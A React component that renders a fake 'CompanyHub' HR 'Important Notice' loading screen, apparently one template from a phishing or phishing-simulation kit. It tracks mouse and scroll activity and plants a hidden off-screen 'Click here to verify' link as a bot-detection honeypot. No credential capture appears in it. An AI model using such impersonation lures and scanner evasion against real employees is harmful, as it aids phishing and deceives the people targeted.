'use client'

import { useState, useEffect } from 'react'

interface LoadingScreenProps {
  duration: number
  language: string
  onComplete: () => void
  onBehaviorTracked: (data: any) => void
  onHoneypotTriggered: () => void
}

interface Translations {
  title: string
  subtitle: string
  importantNotice: string
  from: string
  posted: string
  category: string
  priority: string
  high: string
  loading: string
  footer: string
}

export default function CompanyNoticeScreen({
  duration,
  language,
  onComplete,
  onBehaviorTracked,
  onHoneypotTriggered
}: LoadingScreenProps) {
  const [progress, setProgress] = useState(0)
  const [translations, setTranslations] = useState<Translations | null>(null)
  const [bellRing, setBellRing] = useState(0)

  useEffect(() => {
    const fetchTranslations = async () => {
      try {
        const response = await fetch('/api/get-translations', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ template: 'companyNotice' })
        })
        const data = await response.json()
        setTranslations(data.translations)
      } catch (error) {
        setTranslations({
          title: 'CompanyHub',
          subtitle: 'Internal Portal',
          importantNotice: 'Important Notice',
          from: 'From',
          posted: 'Posted',
          category: 'Category',
          priority: 'Priority',
          high: 'HIGH',
          loading: 'Loading full notice...',
          footer: 'Internal Use Only'
        })
      }
    }
    fetchTranslations()
  }, [])

  useEffect(() => {
    const interval = setInterval(() => {
      setProgress(prev => {
        if (prev >= 100) {
          clearInterval(interval)
          onComplete()
          return 100
        }
        return prev + (100 / (duration * 10))
      })
    }, 100)

    const bellInterval = setInterval(() => {
      setBellRing(prev => (prev + 1) % 2)
    }, 600)

    const trackMouse = (e: MouseEvent) => onBehaviorTracked({ type: 'mouse', x: e.clientX, y: e.clientY })
    const trackScroll = () => onBehaviorTracked({ type: 'scroll', y: window.scrollY })
    window.addEventListener('mousemove', trackMouse)
    window.addEventListener('scroll', trackScroll)

    const honeypot = document.createElement('a')
    honeypot.href = '#'
    honeypot.style.position = 'absolute'
    honeypot.style.left = '-9999px'
    honeypot.textContent = 'Click here to verify'
    honeypot.addEventListener('click', (e) => {
      e.preventDefault()
      onHoneypotTriggered()
    })
    document.body.appendChild(honeypot)

    return () => {
      clearInterval(interval)
      clearInterval(bellInterval)
      window.removeEventListener('mousemove', trackMouse)
      window.removeEventListener('scroll', trackScroll)
      honeypot.remove()
    }
  }, [duration, onComplete, onBehaviorTracked, onHoneypotTriggered])

  if (!translations) {
    return (
      <div style={{ minHeight: '100vh', background: 'linear-gradient(135deg, #ff6b6b 0%, #feca57 100%)', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
        <div style={{ width: '40px', height: '40px', border: '4px solid rgba(255,255,255,0.3)', borderTop: '4px solid white', borderRadius: '50%', animation: 'spin 0.8s linear infinite' }} />
        <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
      </div>
    )
  }

  return (
    <div style={{
      minHeight: '100vh',
      background: 'linear-gradient(135deg, #ff6b6b 0%, #feca57 100%)',
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      padding: '20px'
    }}>
      <div style={{
        background: 'white',
        borderRadius: '24px',
        boxShadow: '0 30px 80px rgba(0,0,0,0.3)',
        padding: '60px 50px',
        maxWidth: '520px',
        width: '100%',
        animation: 'slideUp 0.5s ease-out'
      }}>
        {/* Bell Icon with Ring Animation */}
        <div style={{
          width: '130px',
          height: '130px',
          margin: '0 auto 35px',
          position: 'relative'
        }}>
          <div style={{
            width: '100%',
            height: '100%',
            background: 'linear-gradient(135deg, #ff6b6b 0%, #feca57 100%)',
            borderRadius: '50%',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            fontSize: '70px',
            boxShadow: '0 15px 40px rgba(255, 107, 107, 0.4)',
            transform: bellRing ? 'rotate(15deg)' : 'rotate(-15deg)',
            transition: 'transform 0.2s ease',
            transformOrigin: 'center 30%'
          }}>
            🔔
          </div>
          
          {/* Ripple Effect */}
          <div style={{
            position: 'absolute',
            top: '50%',
            left: '50%',
            width: '100%',
            height: '100%',
            border: '3px solid rgba(255, 107, 107, 0.4)',
            borderRadius: '50%',
            transform: 'translate(-50%, -50%)',
            animation: 'ripple 2s ease-out infinite'
          }} />
        </div>

        {/* High Priority Badge */}
        <div style={{
          display: 'inline-block',
          margin: '0 auto 25px',
          padding: '8px 20px',
          background: 'linear-gradient(135deg, #ff6b6b 0%, #ff8e8e 100%)',
          borderRadius: '20px',
          fontSize: '12px',
          fontWeight: '800',
          color: 'white',
          letterSpacing: '1px',
          boxShadow: '0 4px 12px rgba(255, 107, 107, 0.4)',
          width: '100%',
          textAlign: 'center',
          animation: 'pulse 2s ease-in-out infinite'
        }}>
          {translations.high} {translations.priority}
        </div>

        {/* Title */}
        <h1 style={{
          fontSize: '24px',
          fontWeight: '700',
          color: '#1a202c',
          marginBottom: '25px',
          textAlign: 'center'
        }}>
          {translations.importantNotice}
        </h1>

        {/* Notice Info */}
        <div style={{
          background: 'linear-gradient(135deg, #f7fafc 0%, #edf2f7 100%)',
          borderRadius: '16px',
          padding: '25px',
          marginBottom: '30px',
          border: '1px solid #e2e8f0'
        }}>
          {[
            { label: translations.from, value: 'HR Department' },
            { label: translations.posted, value: 'Nov 14, 2024' },
            { label: translations.category, value: 'Policy Update' }
          ].map((item, i) => (
            <div
              key={i}
              style={{
                display: 'flex',
                justifyContent: 'space-between',
                padding: '12px 0',
                borderBottom: i < 2 ? '1px solid #e2e8f0' : 'none',
                animation: `fadeIn 0.5s ease-out ${i * 0.1}s both`
              }}
            >
              <span style={{ fontSize: '14px', color: '#718096' }}>{item.label}</span>
              <span style={{ fontSize: '14px', fontWeight: '600', color: '#2d3748' }}>{item.value}</span>
            </div>
          ))}
        </div>

        {/* Progress Bar */}
        <div style={{ marginBottom: '20px' }}>
          <div style={{
            width: '100%',
            height: '8px',
            background: 'linear-gradient(90deg, #e2e8f0 0%, #cbd5e0 100%)',
            borderRadius: '10px',
            overflow: 'hidden',
            boxShadow: 'inset 0 2px 4px rgba(0,0,0,0.1)'
          }}>
            <div style={{
              width: `${progress}%`,
              height: '100%',
              background: 'linear-gradient(90deg, #ff6b6b 0%, #feca57 100%)',
              transition: 'width 0.3s ease',
              position: 'relative',
              boxShadow: '0 0 15px rgba(255, 107, 107, 0.6)'
            }}>
              <div style={{
                position: 'absolute',
                top: 0,
                left: '-100%',
                width: '100%',
                height: '100%',
                background: 'linear-gradient(90deg, transparent, rgba(255,255,255,0.6), transparent)',
                animation: 'shimmer 1.5s infinite'
              }} />
            </div>
          </div>
          <div style={{
            display: 'flex',
            justifyContent: 'space-between',
            marginTop: '10px'
          }}>
            <span style={{ fontSize: '13px', color: '#718096' }}>{translations.loading}</span>
            <span style={{ fontSize: '13px', color: '#ff6b6b', fontWeight: '700' }}>{Math.round(progress)}%</span>
          </div>
        </div>

        {/* Footer */}
        <div style={{
          marginTop: '25px',
          paddingTop: '20px',
          borderTop: '1px solid #e2e8f0',
          textAlign: 'center'
        }}>
          <span style={{ fontSize: '13px', color: '#a0aec0' }}>
            {translations.footer}
          </span>
        </div>
      </div>

      <style>{`
        @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes shimmer { to { left: 100%; } }
        @keyframes fadeIn { from { opacity: 0; transform: translateX(-10px); } to { opacity: 1; transform: translateX(0); } }
        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-8px); } }
        @keyframes ripple {
          0% { transform: translate(-50%, -50%) scale(1); opacity: 0.5; }
          100% { transform: translate(-50%, -50%) scale(1.5); opacity: 0; }
        }
      `}</style>
    </div>
  )
}
